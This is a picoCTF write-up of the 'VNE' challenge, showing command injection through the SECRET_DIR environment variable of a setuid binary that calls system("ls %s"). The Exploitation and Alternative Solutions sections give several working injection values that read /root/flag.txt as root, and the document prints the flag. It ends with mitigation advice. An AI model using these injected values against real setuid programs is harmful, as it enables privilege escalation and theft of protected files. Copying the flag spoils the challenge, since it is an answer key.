# picoCTF - VNE Writeup

## Challenge Information
- **Category:** Binary Exploitation
- - **Description:** We've got a binary that can list directories as root, try it out !!
Additional details will be available after launching your challenge instance.
  - Hint 1: Have you checked the content of the /root folder
  - Hint 2: Find a way to add more instructions to the ls
- **Flag:** `picoCTF{Power_t0_man!pul4t3_3nv_d0cc7fe2}`

## Table of Contents
1. [Initial Reconnaissance](#initial-reconnaissance)
2. [Understanding the Binary](#understanding-the-binary)
3. [Identifying the Vulnerability](#identifying-the-vulnerability)
4. [Exploitation](#exploitation)
5. [Technical Deep Dive](#technical-deep-dive)
6. [Alternative Solutions](#alternative-solutions)
7. [Key Concepts](#key-concepts)
8. [Mitigation](#mitigation)

## Initial Reconnaissance

### First Look
```bash
ctf-player@pico-chall$ ls
bin
```

We have a single binary file. Let's examine its properties:

```bash
ctf-player@pico-chall$ file bin
bin: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), 
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
BuildID[sha1]=202cb71538089bb22aa22d5d3f8f77a8a94a826f, 
for GNU/Linux 3.2.0, not stripped
```

### Key Observations
- **setuid binary**: This means the program runs with the privileges of its owner (likely root)
- **not stripped**: Debug symbols are present, making analysis easier
- **64-bit ELF**: Standard Linux executable

### Testing Permissions
```bash
ctf-player@pico-chall$ cd /root
-bash: cd: /root: Permission denied
```

We can't access `/root` directly as a normal user, but the hint suggests we need to check its contents.

## Understanding the Binary

### Running Without Setup
```bash
ctf-player@pico-chall$ ./bin
Error: SECRET_DIR environment variable is not set
```

**Critical Discovery**: The program requires an environment variable called `SECRET_DIR`.

### Testing Normal Behavior
```bash
ctf-player@pico-chall$ export SECRET_DIR="/root"
ctf-player@pico-chall$ ./bin
Listing the content of /root as root: 
flag.txt
```

**Observations**:
1. The program lists the contents of the directory we specify
2. It runs with root privileges (as indicated by "as root")
3. We can see `flag.txt` exists in `/root`
4. Our input (`/root`) appears in the output message

## Identifying the Vulnerability

### Analyzing the Assembly Code

Looking at the disassembly, we can identify the critical flow:

```asm
1385: lea    0xc7d(%rip),%rdi        # Load "SECRET_DIR" string
138c: callq  1200 <getenv@plt>       # getenv("SECRET_DIR")
1391: mov    %rax,-0x68(%rbp)        # Store result

# Later in the code:
146e: mov    $0x0,%edi
146e: callq  1260 <setgid@plt>       # setgid(0) - become root group
1478: mov    $0x0,%edi
1478: callq  1270 <setuid@plt>       # setuid(0) - become root user

# String concatenation occurs here
1442: lea    0xc24(%rip),%rsi        # "ls " string
144c: callq  15c0                    # String concatenation function

# Finally:
148c: callq  11a0 <system@plt>       # system(command)
```

### The Vulnerability

The program is doing something like:
```c
char* secret_dir = getenv("SECRET_DIR");
char command[256];
sprintf(command, "ls %s", secret_dir);
setuid(0);  // Become root
setgid(0);  // Become root group
system(command);  // Execute with shell
```

**The Problem**: The `system()` function passes the command to `/bin/sh -c`, which interprets shell metacharacters. No input sanitization is performed!

## Exploitation

### Understanding Command Injection

Since the program constructs a command like `ls [our_input]` and passes it to `system()`, we can inject additional commands using shell operators:

- `;` - Command separator
- `&` - Run in background
- `&&` - Logical AND
- `||` - Logical OR
- `|` - Pipe

### The Successful Exploit

```bash
ctf-player@pico-chall$ export SECRET_DIR="/root & cat /root/flag.txt"
ctf-player@pico-chall$ ./bin
Listing the content of /root & cat /root/flag.txt as root: 
flag.txt
picoCTF{Power_t0_man!pul4t3_3nv_d0cc7fe2}
```

### What Happened?

The program executed:
```bash
system("ls /root & cat /root/flag.txt")
```

This runs two commands:
1. `ls /root` - Lists the directory (shows "flag.txt")
2. `cat /root/flag.txt` - Displays the flag content

Both execute with root privileges due to the `setuid(0)` call.

## Technical Deep Dive

### Why Environment Variables?

The program chose to read input from an environment variable rather than command-line arguments. This is actually a common pattern, but it doesn't make the program immune to injection attacks.

### The Execution Flow

```
1. User sets: SECRET_DIR="/root & cat /root/flag.txt"
                    ↓
2. Program reads: getenv("SECRET_DIR")
                    ↓
3. Constructs: "ls /root & cat /root/flag.txt"
                    ↓
4. Elevates privileges: setuid(0), setgid(0)
                    ↓
5. Executes as root: system("ls /root & cat /root/flag.txt")
                    ↓
6. Shell interprets & as command separator
                    ↓
7. Both commands run with root privileges
```

### Shell Metacharacter Interpretation

When `system()` is called, it actually executes:
```bash
/bin/sh -c "ls /root & cat /root/flag.txt"
```

The shell interprets `&` as a special character, not as a literal part of the path.

## Alternative Solutions

### Method 1: Semicolon Separator
```bash
export SECRET_DIR="/root; cat /root/flag.txt"
./bin
```

### Method 2: Logical AND
```bash
export SECRET_DIR="/root && cat /root/flag.txt"
./bin
```

### Method 3: Command Substitution
```bash
export SECRET_DIR='$(cat /root/flag.txt) /root'
./bin
```

### Method 4: Newline Injection
```bash
export SECRET_DIR=$'/root\ncat /root/flag.txt'
./bin
```

### Method 5: Using ||
```bash
export SECRET_DIR="/nonexistent || cat /root/flag.txt #"
./bin
```

## Key Concepts

### 1. Setuid Binaries
- Run with the file owner's privileges
- Common privilege escalation vector
- Require extra careful input validation

### 2. Command Injection
- Occurs when user input is passed to system shells
- Shell metacharacters enable command chaining
- Can be prevented with proper input sanitization

### 3. Environment Variables as Attack Vectors
- Often overlooked source of user input
- Persist across program execution
- Can be controlled by attackers

### 4. The system() Function Vulnerability
```c
// Vulnerable:
system(user_controlled_string);

// Safe alternatives:
execve("/bin/ls", argv, envp);  // No shell interpretation
// or sanitize input before using system()
```

## Mitigation

### How to Fix This Vulnerability

1. **Use exec() family instead of system()**:
```c
char *args[] = {"/bin/ls", secret_dir, NULL};
execvp("/bin/ls", args);
```

2. **Input Validation**:
```c
// Check for shell metacharacters
if (strpbrk(secret_dir, ";|&`$(){}[]<>*?~") != NULL) {
    fprintf(stderr, "Invalid characters in path\n");
    exit(1);
}
```

3. **Use Whitelist Approach**:
```c
// Only allow alphanumeric, /, -, and _
if (!is_valid_path(secret_dir)) {
    exit(1);
}
```

4. **Escape Special Characters**:
```c
char escaped[256];
escape_shell_chars(secret_dir, escaped);
sprintf(command, "ls %s", escaped);
```

## Lessons Learned

1. **Never trust user input** - This includes environment variables
2. **Avoid system() when possible** - Use exec() family functions
3. **Setuid requires extra caution** - Any vulnerability becomes privilege escalation
4. **Shell metacharacters are dangerous** - Always sanitize or avoid shell interpretation
5. **Defense in depth** - Multiple layers of validation and sanitization

## Flag Explanation

`picoCTF{Power_t0_man!pul4t3_3nv_d0cc7fe2}`

- **Power_t0_man!pul4t3_3nv**: "Power to manipulate env" - referring to the ability to manipulate environment variables to gain unauthorized access
- The challenge demonstrates how environment variables can be an overlooked attack vector

## Conclusion

This challenge demonstrates a classic command injection vulnerability through environment variables. The combination of:
- Setuid binary (privilege escalation)
- Unsanitized user input (environment variable)
- Use of system() function (shell interpretation)

Creates a perfect storm for exploitation. Real-world applications should never trust user-controlled input when constructing shell commands, especially in privileged contexts.

---

*Challenge solved by: ctf-player*  
*Platform: picoCTF*  
*Category: Binary Exploitation*  
*Technique: Command Injection via Environment Variables*
